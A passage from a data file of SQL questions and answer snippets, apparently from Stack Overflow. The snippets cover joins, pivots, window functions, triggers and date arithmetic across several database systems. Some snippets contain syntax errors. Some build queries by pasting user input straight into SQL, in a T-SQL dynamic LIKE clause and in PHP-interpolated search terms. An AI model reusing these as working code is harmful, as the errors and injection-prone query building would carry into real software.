    	ORDER BY
    		dist DESC
    	LIMIT 1 OFFSET s
    	) AS b_id
    FROM	(
    	SELECT DISTINCT a_id
    	FROM mytable mia
    	) ma, generate_series (1, 10) s
    ) ab
WHERE   b_id IS NOT NULL
"
26626,69016,Upserting a row into an hsqldb table using the MERGE SQL statement,"CREATE TABLE B(ID INT UNIQUE, A_ID INT);

MERGE INTO B 
  USING (VALUES 2, 3) I (ID, A_ID) 
  ON (B.ID=I.ID)
  WHEN MATCHED THEN UPDATE SET B.A_ID = I.A_ID
  WHEN NOT MATCHED THEN INSERT (ID, A_ID) VALUES (I.ID, I.A_ID)
"
33262,55354,MS Access Multiple SELECT Query,"SELECT Clients.CLIENT_NUM as CID
FROM (Clients INNER JOIN Farms ON Clients.ID = Farms.ClientID)
    INNER JOIN Fields ON Farms.ID = Fields.FarmID
WHERE Fields.Year = 2014 AND Fields.FIELD_NUM = '28-2'
"
36065,25501,Find most frequent value in SQL column,"SELECT       `value`,
             COUNT(`value`) AS `value_occurrence` 
    FROM     `my_table`
    GROUP BY `value`
    ORDER BY `value_occurrence` DESC
    LIMIT    1;
"
757,43591,Adding rows in table2 automatically on the basis of a specific column's input in table1,"delimiter //
create trigger ins_table2 after insert on table1
for each row
begin
  declare t2_cnt_index int default 1;
  while t2_cnt_index <= new.num do  
    insert into Table2 (desc2,id1) values (new.desc2,new.id1);
    set t2_cnt_index := t2_cnt_index + 1; 
  end while ;
end ; //
delimiter ;
"
3673,17386,If connection fails between linked servers on SQL Server 2008,"BEGIN TRANSACTION
BEGIN TRY
    --UPDATE
    COMMIT TRANSACTION
END TRY
BEGIN CATCH
    --INSERT INTO UpdateFail TABLE
    ROLLBACK TRANSACTION 
END CATCH
"
24302,4450,MySQL combinations 2 coloumns as primary key,"create table version (
    admin_id varchar(20),
    versionid integer,
    employeeid varchar(20),
    constraint pk_version primary key (admin_id, versionid)
);
"
7736,26734,SQL Select statment with remove first row," SELECT * FROM (
    select ROW_NUMBER()OVER(ORDER BY id ASC) row,* from pdetails where pcode='P000437'
    )t
    WHERE row != 1;
"
8270,65476,MySQL: Combining the results of 2 columns in one statement,"SELECT
  name
FROM 
  person
  /* Join against the other table on *either* column c_1 or c_2 */
  INNER JOIN `table` ON `table`.c_1 = person.person_id OR `table`.c_2 = person.person_id
WHERE
  /* And the WHERE condition only needs to be applied once */
  c_1 = 3 OR c_2 = 3
"
23960,69571,MONTHS_BETWEEN in Oracle.. Exact logic of calculation,"FLOOR(ABS(MONTHS_BETWEEN(D1,D2))) + /* The Actual Month difference, as whole number */
 (TO_CHAR(D1,'DD') - TO_CHAR(D2,'DD'))/31 /* Remaining Days / 31)*/
"
10714,36330,Sql query for getting user parametar from database,"select date_check 
from tableA
where (:parametar='S' AND date_check IS NOT NULL)
OR date_check IS NULL
"
4114,5906,Compare a date string to datetime in SQL Server?," DECLARE @p_date DATETIME
 SET     @p_date = CONVERT( DATETIME, '14 AUG 2008', 106 )

 SELECT  *
 FROM    table1
 WHERE   column_datetime >= @p_date
 AND     column_datetime < DATEADD(d, 1, @p_date)
"
18564,4552,Mysql SQL Minus query,"SELECT distinct b2.*
FROM bookings b1, bookings b2, booking_states bs 
WHERE bs.name = 'Pending'
AND b1.id = 2
AND b1.id <> b2.id
AND bs.id = b1.booking_state_id
AND bs.id = b2.booking_state_id
AND b1.boat_id = b2.boat_id
AND (date(b1.departure_date) <= b2.departure_date AND date(b1.arrival_date) >= b2.departure_date)   
OR (date(b1.departure_date) <= b2.arrival_date AND date(b1.arrival_date) >= b2.arrival_date)
AND NOT EXISTS (SELECT 1 
FROM bookings b 
WHERE b1.id <> b.id)
"
29416,2055,How to get multiple value from the table,"CREATE FUNCTION [dbo].[fnGetIDasTable] (
    @ids varchar(MAX), 
    @separator varchar(20)
) RETURNS @retTable TABLE(ID bigint)
BEGIN
    DECLARE @firstComma bigint
    IF (@ids IS NOT NULL)
    BEGIN
        WHILE @ids != ''
        BEGIN
            SET @firstComma = CHARINDEX(@separator, @ids)
            IF @firstComma = 0
            BEGIN
                INSERT INTO @retTable 
                    VALUES (@ids)
                RETURN
            END
            INSERT INTO @retTable 
                VALUES (CONVERT(bigint, SUBSTRING(@ids, 1, @firstComma - 1)))
            SET @ids = SUBSTRING(@ids, @firstComma + 1, LEN(@ids))
        END
    END
    RETURN
END
GO

DECLARE @IdList varchar(MAX) = '1,3'
SELECT id FROM Table1 
    INNER JOIN [dbo].[fnGetIDasTable] (@IdList,',') il ON Table1.id = il.ID
GO
"
22993,65765,Oracle Substring (substrb) Split on space,"CREATE OR REPLACE FUNCTION JCOLLECT.GET_SUB_STRING(STR IN VARCHAR2, STR_DELIMITOR IN VARCHAR2:='.',STR_PART IN VARCHAR2:='1') RETURN VARCHAR2 IS STR_RET VARCHAR2(4000):=NULL; BEGIN
IF STR_PART = '1' THEN        
    STR_RET := substr(STR, 1, instr(STR,STR_DELIMITOR,1,1)-1);        
ELSE    
    STR_RET := substr(STR, instr(STR,STR_DELIMITOR,1,STR_PART-1)+1,instr(STR, STR_DELIMITOR, 1,STR_PART)- instr(STR, STR_DELIMITOR, 1,STR_PART-1)-1);        
END IF; RETURN STR_RET; END;
"
8249,64809,How to select only those rows which have more than one of given fields with values,"SELECT
   IF(`column1` != 0,1,0) +
   IF(`column2` != 0,1,0) +
   IF(`column3` != 0,1,0) +
   IF(`column4` != 0,1,0) AS `results_sum`
FROM `table`
HAVING
   `results_sum` > 1
"
12375,19822,select more rows as a column,"UPDATE  organisaties o
SET     o.trefwoorden_flat = 
        (
        SELECT  GROUP_CONCAT(t.naam SEPARATOR ',')
        FROM    trefwoorden t
        INNER JOIN
                organisaties_has_trefwoorden AS o
        ON      t.id_trefwoorden = o.id_trefwoorden
        WHERE   o.id_organisaties = NEW.id_organisaties       
        )
WHERE   o.id_organisaties = NEW.id_organisaties  
"
1589,32082,One extra row in a sum column query,"SELECT t.taskid
  FROM tasks t 
 CROSS
  JOIN (SELECT @var_sum := 0) a
 WHERE IF(@var_sum<10, @var_sum := @var_sum+t.taskid, @var_sum := NULL) IS NOT NULL
"
12320,63125,Sybase add incrementing counter to a select statement,"select counter = identity(10), data1, data2 into #t1 from tablename

select * from #t1
drop table #t1
"
28465,35811,SQL Finding records with one value,"select PersonID, CodeID
from T
where CodeID is not null or PersonID in (
    select PersonID
    from T
    group by PersonID
    having min(CodeID) is null
)
"
32635,59483,Get rows with single values using SQlite,"SELECT *
FROM mytable
WHERE B IN (SELECT B FROM mytable GROUP BY B HAVING COUNT(DISTINCT A)=1)
"
9098,26024,How to use the sum query for specific rows,"SELECT members.member_id, members.teamname, SUM(total_points)
FROM members, members_leagues, member_results
   WHERE members.member_id = members_leagues.member_id
     AND members_leagues.league_id = '45'
       AND member_results.track_id = '1'
          AND member_results.member_id = members_leagues.member_id
             AND members_leagues.start_race >= member_results.track_id 
GROUP BY members.memberID
"
19775,16834,How to calculate relative value of column depending upon other rows?,"select 
  a.AID
, a.City
, a.IndividualScore
, a.IndividualScore
  + sum(case when oa.IndividualScore > a.IndividualScore then oa.IndividualScore - a.IndividualScore else 0 end) as RelativeScore
from tblActor a
left join tblActoroa on a.City = oa.City-- other actor
where a.AID != oa.AID
group by   
  a.AID
, a.City
, a.IndividualScore
"
11524,49090,Joining next Sequential Row,"select sum(case when seqnum = num then stat else - stat end) / (max(num) - 1);
from (select period, row_number() over (order by period) as seqnum,
             count(*) over () as num
      from tbstats
     ) t
where seqnum = num or seqnum = 1;
"
7993,71480,sql server 2005 similar to split,"SELECT ope_autoventaid,
SUBSTRING(ope_name, charindex('latitud:',ope_name)+8,
                    charindex('|longitud:',ope_name)-9)
    as latitud,
SUBSTRING(ope_name, charindex('longitud:',ope_name)+9,
                    charindex('|timegps:',ope_name)-9-charindex('longitud:',ope_name))
    as longitud,
SUBSTRING(ope_name, charindex('timegps:',ope_name)+8
                  , len(ope_name)-charindex('timegps:',ope_name))
    as timegps
FROM myTable; 
"
24779,1133,Sum of five lowest values," select a.ID, SUM(a.points) from(select ID , points,row_number() over 
    (partition by ID order by POINTS) as rownum_returned from your_table) a where 
a.rownum_returned<6  group by a.ID;
"
15665,18698,Oracle analytic function window defined by data,"SELECT seq_emp 
      ,SUBSTR(emp_seq_name,10) emp_name 
      ,seq_data 
      ,emp_data 
FROM  (SELECT MAX(CASE WHEN rec_type = '100' THEN rec_seq END) 
              OVER (ORDER BY rec_seq 
                    ROWS BETWEEN UNBOUNDED PRECEDING 
                             AND CURRENT ROW) seq_emp 
             ,MAX(CASE 
                  WHEN rec_type = '100' 
                  THEN TO_CHAR(rec_seq,'fm00000000') || '|' || rec_data 
                  END) 
              OVER (ORDER BY rec_seq 
                    ROWS BETWEEN UNBOUNDED PRECEDING 
                             AND CURRENT ROW) emp_seq_name 
             ,rec_seq seq_data 
             ,rec_type 
             ,rec_data emp_data 
       FROM   mdtest) 
WHERE  rec_type = '200' 
ORDER BY seq_data; 
"
42,29549,SQL Null set to Zero for adding,"SELECT Column1, Column2, IIF(ISNULL(Column3),0,Column3) + IIF(ISNULL(Column4),0,Column4) AS [Added Values]
FROM Table
"
37535,5540,INNER LOOP JOIN Failing,"UPDATE E  
SET E.FamName = S.Surnames 
FROM (
 SELECT *, (1 + ABS(CRYPT_GEN_RANDOM(8) % (SELECT COUNT(*) FROM Surnames))) AS SurnameID
 FROM Episode AS E 
) E
INNER LOOP JOIN Surnames AS S ON S.ID = E.SurnameID
"
14663,42381,Insert a empty string on SQL Server with BULK INSERT,"Bulk Insert same CSV file into table
BULK INSERT Adventure.dbo.BulkInsertTest
   FROM '....\test.csv'
   WITH 
      (
         FIELDTERMINATOR ='\,',
         ROWTERMINATOR ='\n'
      )
   SELECT * FROM BulkInsertTest
"
9805,23651,Access SQL that will display multiple maximum/minimum values and their corresponding case,"Select ""Flxmax"" As FField, [case], [Flxmax] 
From (SELECT case, [Flxmax]
    FROM Force
    WHERE [Flxmax] = (SELECT Max([Flxmax]) FROM Force))
Union All
Select ""Flxmin"" As FField, [case], [Flxmin] 
From (SELECT case, [Flxmin]
    FROM Force
    WHERE [Flxmin] = (SELECT Min([Flxmin]) FROM Force))
Union All    
Select ""Frxmax"" As FField, [case], [Frxmax] 
From (SELECT case, [Frxmax]
    FROM Force
    WHERE [Frxmax] = (SELECT Max([Frxmax]) FROM Force))
Union All    
Select ""Frxmin"" As FField, [case], [Frxmin] 
From (SELECT case, [Frxmin]
    FROM Force
    WHERE [Frxmin] = (SELECT Min([Frxmin]) FROM Force))
"
9220,45658,"SQL: Sort by priority, but put 0 last","order by case priority when 0 then 2 else 1 end, priority
"
33915,25197,Getting current connection properties in SQL Server,"select * from sys.dm_exec_connections
where session_id = @@SPID
"
11161,20087,Selecting Rows Where Conditions Match A Single Row?,"SELECT * FROM tableA
INNER JOIN tableB
ON tableA.timetag >= tableB.start
AND tableA.timetag <= tableB.stop
WHERE tableB.id = ""1""
"
23657,31674,How can I eliminate the subquery to simplify my query?,"SELECT DISTINCT t1.extension
    , IFNULL(t2.status, t1.status) AS status
    , IFNULL(t2.systemid, t1.systemid) AS systemid
FROM pbx AS t1 
    LEFT OUTER JOIN
    pbx AS t2
    ON t1.extension = t2.extension
        AND t2.status = 'OK'
GROUP BY t1.extension, t2.status
ORDER BY t1.extension
"
30391,31170,AS being ignored in a subquery,"SELECT CAR.name, Car_Purchase.cost_per_night, Car_Purchase.description, Cost_of_Car
FROM Car_Purchase 
JOIN CAR ON Car_Purchase.purchase_id = CAR.purchase_id
join (SELECT MAX(cost) AS Cost_of_Car FROM Car_Purchase) subquery
ON Car_Purchase.cost = subquery.Cost_of_Car
GROUP BY CAR.name, Car_Purchase.cost_per_night, Car_Purchase.description
"
17628,67932,need replace id_parent on name in SQL Server,"SELECT StrtbmovieParent.Name as ParentName,
       Strtbuser.Name  as 'Name',
       Strtbmovie.Name as Movie,
       sum(Strtbmovieatt.CountBeginWatch),
       sum(Strtbmovieatt.CountEndWatch),
       sum(Strtbmovieatt.CountBeginTest),
       sum(Strtbmovieatt.CountEndTest),
       max(Strtbmovieatt.CountTest)
FROM   Strtbmovie
       INNER JOIN Strtbmovieatt
         ON Strtbmovie.Idmovie = Strtbmovieatt.Idmovie
       INNER JOIN Strtbuser
         ON Strtbmovieatt.Iduser = Strtbuser.Iduser
       INNER JOIN Strtbmovie as StrtbmovieParent
         ON Strtbmovie.id_parent = StrtbmovieParent.Idmovie
GROUP  BY Strtbmovie.Name,
          Strtbuser.Name,
          StrtbmovieParent.Name
"
38310,21112,Regular Expressions _# at end of string,"SELECT * FROM Table WHERE  REGEXP_LIKE (COLUMN,'_[[:digit:]]$')
"
22117,15559,How do i combine multiple select statements in separate columns?,"select count (distinct vid) as SUM_OF_SEC ,(select sum (amount*paidperitem) from pdalis where pid = 501 ;) AS SUM_OF_A , (select sum(amount * paidperitem) from pdalis where pid IN (500,504);) as SUM_OF_P  from pdalis where pid in(500,504);
"
9628,19566,SQL Selecting multiple sums?,"SELECT  SUM(CASE WHEN order_date >= '01/01/09' THEN quantity ELSE 0 END) AS items_sold_since_date,
        SUM(quantity) AS items_sold_total,
        product_ID
FROM    Sales
GROUP BY product_ID
"
24740,40916,How do I get the most recent records based on as of date?,"select number, name, date
from Recent_Table
where Date = (SELECT MAX(DATE) AS recent_date
              FROM Recent_Table
              WHERE DATE < '2015-05-19')
"
27859,19517,How do I find out when a stored procedure was last modified or compiled in Oracle?,"SELECT LAST_DDL_TIME, TIMESTAMP
FROM USER_OBJECTS
WHERE OBJECT_TYPE = 'PROCEDURE'
AND OBJECT_NAME = 'MY_PROC';
"
30620,58638,Join data from one sql result set,"SELECT HedgeDate, CompanyName, HedgeValue 
FROM GasHedges
LEFT OUTER JOIN GasCompanies ON GasHedges.CompanyID = GasCompanies.ID
PIVOT (count(HedgeValue) FOR CompanyName in ([RWET], [JPMorgan], [Statoil]))
WHERE HedgeDate BETWEEN '2014-09-01' AND '2014-09-05'
"
14431,48242,sql update with previous month data,"Update Table_Name_Here set DateField_Name_Here = DateAdd(month, 1, DateField_Name_Here) Where RecordTypeField_Name_Here = 'recordA';
"
15486,51032,Mysql query with multiple columns,"SELECT b.xmlText, b.sid, b.qid, a.fid
FROM tableA a
JOIN tableB b ON b.sid = a.sid AND b.qid = a.qid AND a.fid = 213;
"
35104,72312,SQL Select rows from table where all joined rows match value,"SELECT * FROM A WHERE A.ID1 
NOT IN 
( 
  SELECT DISTINCT A.ID1 FROM A 
  JOIN B ON A.ID1=B.ID1
  JOIN C ON B.ID2=C.ID2 WHERE C.value = 'N'
)
"
470,24479,Nested Inner join query,"SELECT TOP(10) a.ID 
FROM attr AS a 
    INNER JOIN data AS X ON a.ID = x.ID
    INNER JOIN extradata XA ON X.dataID = XA.dataID
    INNER JOIN syst AS s ON a.sysID = s.sysID
WHERE X.data = 'condition1' 
  and NOT XA.additionaldata = 'condition2'
  and s.desc = 'condition3'
"
1907,41356,Multiple SQL commands that should only execute if they all pass,"begin transaction
    insert into tableA . . . 
    insert into tableB . . .
commit transaction;
"
28236,69999,Using Distinct and COALESCE Together using variable,"SELECT @Data = COALESCE(@Data + ',', '') + column2
FROM (
  SELECT DISTINCT column2
  FROM Table
  WHERE column1= 'DIU02'
) t
"
21592,71715,Update multiple rows in table from sql export file,"UPDATE api_hotspot
LEFT JOIN export ON export.id = api_hotspot.id
SET api_hotspot.address = export.address, api_hotspot.lat = export.lat, api_hotspot.lng = export.lng
"
14054,23975,Using two mdbs to Select Into a third,"Function AccessLinkToTable(sLinkFromDB As String, sLinkToDB As String, sLinkToTable As String, Optional sNewLinkTableName As String, Optional sPassword As String) As Boolean
    'Inputs      :  sLinkFromDB                 The path to the original database.
    '               sLinkToDB                   The path to the database to link to.
    '               sLinkToTable                The table name to link to in sLinkToDB.
    '               [sNewLinkTableName]         The name of the new link table. sLinkFromDB.
    'Outputs     :  Returns True if succeeded in linking to the table
    'Author      :  Andrew Baker www.vbusers.com
    'Date        :  03/09/2000 14:17
    'Notes       :  Requires a reference to reference to both ADO (MS ActiveX Data Objects) and MSADOX.DLL
    '               (MS ADO Ext. 2.5 DLL and Security).
    'Revisions   : 21.1.2002, Roman Plischke, password
    Dim catDB As ADOX.Catalog
    Dim TblLink As ADOX.Table

    On Error GoTo ErrFailed
    If Len(Dir$(sLinkFromDB)) > 0 And Len(Dir$(sLinkToDB)) > 0 Then
        'Databases exist
        Set catDB = New ADOX.Catalog
        'Open a Catalog on database in which to create the link.
        catDB.ActiveConnection = ""Provider=Microsoft.Jet.OLEDB.4.0;"" & ""Data Source="" & sLinkFromDB

        Set TblLink = New ADOX.Table
        With TblLink
            'Name the new Table
            If Len(sNewLinkTableName) Then
                .Name = sNewLinkTableName
            Else
                .Name = sLinkToTable
            End If

            'Set ParentCatalog property to the open Catalog.
            'This allows access to the Properties collection.
            Set .ParentCatalog = catDB

            'Set the properties to create the link.
            .Properties(""Jet OLEDB:Create Link"") = True
            .Properties(""Jet OLEDB:Link Datasource"") = sLinkToDB
            .Properties(""Jet OLEDB:Remote Table Name"") = sLinkToTable
            If Len(sPassword) Then
                .Properties(""Jet OLEDB:Link Provider String"") = ""MS Access;Pwd="" & sPassword
            End If
        End With

        'Append the table to the Tables collection.
        catDB.Tables.Append TblLink
        Set catDB = Nothing
        'Set return as success
        AccessLinkToTable = True
    End If
    Exit Function

ErrFailed:
    On Error GoTo 0
    AccessLinkToTable = False
End Function

Function AccessLinkTableUpdate(sLinkDatabasePath As String, sLinkToNewDatabase As String, sLinkTableName As String) As Boolean
    Dim catDB As ADOX.Catalog

    On Error GoTo ErrFailed
    Set catDB = New ADOX.Catalog
    'Open a catalog on the database which contains the table to refresh.
    catDB.ActiveConnection = ""Provider=Microsoft.Jet.OLEDB.4.0;"" & ""Data Source="" & sLinkDatabasePath
    If catDB.Tables(sLinkTableName).Type = ""LINK"" Then
        catDB.Tables(sLinkTableName).Properties(""Jet OLEDB:Link Datasource"") = sLinkToNewDatabase
        AccessLinkTableUpdate = True
    End If
    Set catDB = Nothing
    Exit Function

ErrFailed:
    On Error GoTo 0
    AccessLinkTableUpdate = False
End Function
"
34647,39869,Cumulative sum query on foreign key,"SELECT Main.id, Main.spentHours,
(
    SELECT SUM(spentHours) 
    FROM Table1 WHERE Table1.id = Main.id
    AND Table1.record_id >= Main.record_id
) as totalSpentHours
FROM Table1 Main
ORDER BY Main.record_id ASC
"
14035,47352,BLtoolkit association,"1. Define field in the Question entity for ThisKey property:

[MapField(""c_to"")]
public int BandId { get; set; }

2. Define field in the Band entity for OtherKey property:

[MapField(""id"")]
public string BandId { get; set; }

3. Rewrite To property in the Question entity:

[Association(CanBeNull = false, OtherKey = ""BandId"", ThisKey = ""BandId"")]
public Band To { get; set; }
"
36121,31198,SQL Return only where more than one join,"
SELECT   dbo.tb_Company.CompanyID
        , dbo.tb_Company.CompanyName
        , dbo.tb_Division.DivisionName 
FROM    dbo.tb_Company 
        INNER JOIN dbo.tb_Division ON dbo.tb_Company.CompanyID = dbo.tb_Division.DivisionCompanyID
        INNER JOIN (
          SELECT  DivisionCompanyID
          FROM    dbo.tb_Division
          GROUP BY
                  DivisionCompanyID
          HAVING  COUNT(*) > 1
        ) d ON d.DivisionCompanyID = dbo.tb_Company.CompanyID
"
21970,40612,PL/SQL - Delete a character in a VARCHAR2,"END LOOP;

ORDRE_DYN := RTRIM(ORDRE_DYN, ',');
"
34698,47072,Table Pivot with AVG inside MAX(DECODE()),"SELECT x.NAME as ""Drink"", 
(MAX(DECODE(x.TYPE, 'Small', avg, NULL))) Small,
(MAX(DECODE(x.""TYPE"", 'Medium', avg, NULL))) Medium,
(MAX(DECODE(x.""TYPE"", 'Large', avg, NULL))) Large
FROM (
      SELECT Size.""TYPE"", Drink.NAME, Round(AVG(Size.price),2) avg 
      FROM Drink, Price 
      WHERE Drink.drink_id = Size.drink_id
      GROUP BY Size.""TYPE"", Drink.NAME) x
GROUP BY x.NAME
ORDER BY x.NAME;
"
27791,3507,Return only rows whose max value is greater than specified,"select *
FROM tbldealermobiles m
INNER JOIN tblhistory h ON m.FCS = h.FCS
INNER JOIN tblAllDealers a ON m.FCS = a.FCS
WHERE a.CustGroup in ('Virtual', 'Outbound')
and h.PurchaseDate = (
    select max(h2.PurchaseDate) from tblhistory h2
    where h2.fcs = a.fcs)
and (a.CustGroup = 'Virtual' AND
     h.PurchaseDate < date('2013-03-22')
  or 
    a.CustGroup = 'Outbound' AND 
    h.PurchaseDate < date('2013-04-21'))
ORDER BY h.PurchaseDate DESC
"
15090,36125,"MySQL, alternative to using IN which will prioisties the first value?","SELECT * FROM (
    SELECT 1 as prec, column-list FROM table-list
    WHERE Keywords.Word = '$search[0]'
    LIMIT 100) A
UNION ALL
SELECT * FROM (
    SELECT 2 as prec, column-list FROM table-list
    WHERE Keywords.Word = '$search[1]'
    LIMIT 100) B
UNION ALL
SELECT * FROM (
    SELECT 3 as prec, column-list FROM table-list
    WHERE Keywords.Word = '$search[2]'
    LIMIT 100) C
ORDER BY prec
LIMIT 100;
"
19467,48839,how to group by a field that has both select and count,"create table C as(
select a.id, a.date_id, 
SUM(CASE WHEN b.hits >= '9' THEN 1 ELSE 0 END)/COUNT(b.hits) AS percent 
from A a join B b
on a.id = b.id
group by 1,2) with no data primary index(id);
"
33792,51895,DateDiff every 3 days,"SELECT DISTINCT 
CLAIM_NO,
ModifiedBy,
ClaimType,
ClaimStatus,
EmailAddress,
FROM EP_ADMIN_ITEM_REMINDER
WHERE Status = 1 AND DATEDIFF(Day,DateAdded,getdate()) > 2
"
17007,6299,Is it correct to say that data reading operations need not run inside transactions?,"select * from Tab
except select * from Tab
"
32787,13518,Change Value based on previous rows in mysql,"select
t.*,
if(@previd = po_id and @prevprod = Product, 0, Quantity) AS new_quantity,
@previd := po_id,
@prevprod := product
from
t
, (select @previd:=null, @prevprod:=null) var_init
order by po_id, product
"
31452,54045,Date functions in Teradata,"select ADD_MONTHS(cast('2016/01/25' as date),1)-1
"
23172,75208,SQL: Finding DB entry that ends a given string,"select * from table_name where :userParam like CONCAT('%', domain)
"
23031,5882,Sql select top query,"SELECT SUM(t1.CommitAmt) from (SELECT TOP(1) CommitmentLog.CommitAmt
                                  FROM   leveldetails
                                    INNER JOIN CommitmentLog
                                      ON leveldetails.App_ID = CommitmentLog.app_id
                                      AND leveldetails.Intro_ID = '999'
                                      AND leveldetails.Side = 'right'
                                      AND CommitmentLog.flag != '1'
                                      AND CommitmentLog.CommitNo NOT IN (SELECT commit_no
                                                     FROM   binary_bal
                                                     WHERE  Intro_ID = '999'
                                                            AND Side = 'right'
                                                            AND llevel BETWEEN 1 AND 100000)
                              ) AS t1
"
15337,8661,T-SQL - How to write a complex conditional join including a many-to-many join,"DECLARE @SQL NVARCHAR(4000)

SET @SQL = 'SELECT DISTINCT
                   p.personid,
                   p.personname,
                   c.city
              FROM TBLPERSON p
         LEFT JOIN TBLCITIES c ON c.personid = p.personid '

SET @SQL = @SQL + CASE 
                    WHEN @grouplist IS NOT NULL THEN
                      ' JOIN (SELECT m.PersonID
                                FROM TBLGROUPMEMBERSHIP m
                               WHERE m.GroupID IN (SELECT item FROM fnSplit(@grouplist, ',')))
                            GROUP BY m.PersonID
                              HAVING COUNT(*) = (SELECT COUNT(*) FROM fnSplit(@grouplist, ',')))) g ON g.personid = p.personid '
                    ELSE
                      ' '
                  END

  SET @SQL = @SQL + ' WHERE 1 = 1 ' --trick to make contatentating WHERE clause easier

IF @name IS NOT NULL
  SET @SQL = @SQL + ' AND p.personname LIKE '%' + @name + '% '

IF @city IS NOT NULL
  SET @SQL = @SQL + ' AND c.city LIKE '%' + @city + '% '  

BEGIN

  EXEC sp_executesql @SQL N'@grouplist varchar(50), @grouplist varchar(50), @name varchar(50), @city varchar(50)',
                      @grouplist, @grouplist, @name, @city

END
"
32176,49022,Select min value per item in MySQL,"SELECT t.* FROM mytable  t
JOIN 
( SELECT item, MIN(value) minVal
  FROM mytable  GROUP BY item
) t2
ON t.value = t2.minVal AND t.item = t2.item;
"
12602,45380,SQL logic: sort result by product of a column and number of colums of a specific type,"   SELECT *, null AS score, '0' AS SortOrder, 1 AS mult
        FROM products
        WHERE datelive < 0
   UNION
   SELECT p.*, ROUND(AVG(r.score)) AS score, '1' AS SortOrder,
            SUM(r.score > 3.53)/count(*) AS mult
        FROM products p
        LEFT JOIN reviews r
            ON r.id = p.id
            AND p.datelive > 0
        GROUP BY p.id
        HAVING COUNT(*) >= 5
    UNION
    SELECT p.*, null AS score, '2' AS SortOrder, 1 AS mult
        FROM products p
        LEFT JOIN reviews r
            ON r.id = p.id
            WHERE p.datelive > 0
        GROUP BY p.id
        HAVING COUNT(*) < 5
    ORDER BY SortOrder ASC, score*mult DESC
"
32218,15202,SQL: Join two different rows from the same table to a relation,"select rel.id, rel.type, p1.id, p1.name, p2.id, p2.name
  from relation rel
     , person p1
     , person p2
 where rel.person1 = p1.id
   and rel.person2 = p2.id
"
8431,4151,sp_prepare and sp_execute,"select * from sys.dm_exec_query_plan(PlanHandle)
"
2237,20391,Retrieving time period t-sql,"SET @Start = DATEADD(MINUTE, 30, DATEADD(HOUR, 17, DATEADD(DAY, DATEDIFF(DAY, 0, GETDATE()), -1)))

SET @End = DATEADD(DAY, DATEDIFF(DAY, 0, GETDATE()), 1)
"
10843,50247,Combine rows in SQL Server,"declare @tb table (username varchar(10),starttime datetime,endtime datetime )
insert into @tb values('0100810','2016-01-04 16:00','2016-01-04 17:00')
insert into @tb values('0100810','2016-01-04 17:01','2016-01-04 17:20')
insert into @tb values('0100820','2016-01-04 18:00','2016-01-04 19:00')

insert into @tb values('0100810','2016-01-04 17:22','2016-01-04 17:30');

--select username,DATEADD(MINUTE,1,starttime) st, starttime,endtime from @tb
WITH StartTimes AS
(
  SELECT DISTINCT username, starttime
  FROM @tb AS S1
  WHERE NOT EXISTS
    (SELECT * FROM @tb AS S2
     WHERE S2.username = S1.username
       AND S2.starttime < S1.starttime
       AND DATEADD(MINUTE,1,S2.endtime) >=S1.starttime)
),
EndTimes AS
(
  SELECT DISTINCT username, endtime
  FROM @tb AS S1
  WHERE NOT EXISTS
    (SELECT * FROM @tb AS S2
     WHERE S2.username = S1.username
       AND S2.endtime > S1.endtime
       AND S2.starttime <= DATEADD(MINUTE,1,S1.endtime))
)
SELECT username, starttime,
  (SELECT MIN(endtime) FROM EndTimes AS E
   WHERE E.username = S.username
     AND DATEADD(MINUTE,1,E.endtime) >= starttime) AS endtime
FROM StartTimes AS S;
"
27711,12736,Best way to update a live database while persisting data?,"ALTER TABLE ADD NewColumn nvarchar(50) NULL
"
33942,31140,"I would like to sum the all of the colums in an alias called ""totals"" for my oracle sql code below","SELECT 'ABLATIONS' AS PROCEDURES,
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),1,EPV.SITE_ABL)) AS ""Jan"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),2,EPV.SITE_ABL)) AS ""Feb"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),3,EPV.SITE_ABL)) AS ""Mar"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),4,EPV.SITE_ABL)) AS ""Apr"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),5,EPV.SITE_ABL)) AS ""May"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),6,EPV.SITE_ABL)) AS ""Jun"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),7,EPV.SITE_ABL)) AS ""Jul"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),8,EPV.SITE_ABL)) AS ""Aug"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),9,EPV.SITE_ABL)) AS ""Sep"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),10,EPV.SITE_ABL)) AS ""Oct"",
       count(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),11,EPV.SITE_ABL)) AS ""Nov"",
       COUNT(DECODE(EXTRACT(MONTH FROM EPV.ADMIT_DT),12,EPV.SITE_ABL)) AS ""Dec"",
       COUNT(EPV.SITE_ABL) AS ""Annual Total""
  FROM APEX_DATA.EP_VISIT EPV
  WHERE EXTRACT(YEAR FROM EPV.ADMIT_DT) = 2010
"
36636,15140,How to SELECT only few rows from a column in sql (SQLite Database Browser)?,"SELECT * FROM test 
         WHERE ROWID BETWEEN
                             (SELECT ROWID FROM test WHERE words = 'xerox') + 1 
                     AND
                             (SELECT ROWID FROM test WHERE words = 'stars') - 1 
UNION ALL
SELECT '---'
UNION ALL
SELECT * FROM test
         WHERE ROWID BETWEEN
                             (SELECT ROWID FROM test WHERE words = 'pen')
                     AND
                             (SELECT ROWID FROM test WHERE words = 'apes');
"
7644,40434,MYSQL Query - grabbing all the records that meet the criteria 3 or more times,"select dp.*
from delinquent_property dp join
     (SELECT parcel, COUNT(*)
      FROM delinquent_property
      WHERE year IN ('2013', '2012', '2011', '2010', '2009') AND
           CAST(replace(replace(ifnull(due,0),',',''),'$','') AS decimal(10,2)) > 0
     GROUP BY parcel
     HAVING COUNT(*) > 2
    ) p3
    on dp.parcel = p3.parcel
where CAST(replace(replace(ifnull(due,0),',',''),'$','') AS decimal(10,2)) > 0
order by parcel;
"
36143,23233,dense_rank() order by and nulls - how to make it treat them as bottom of the ranking?,"SELECT ""A"", dense_rank() OVER (ORDER BY ""A"" DESC NULLS LAST)
FROM   public.""Test"""
2243,75380,SQL query: select the last record where a value went below a threshold,"select tablename.* from tablename
inner join 
(
    select tablename.item, min(tablename.[date]) as mindate 
                from tablename
        inner join (
                        select 
                             item, 
                             max([date]) lastoverdate 
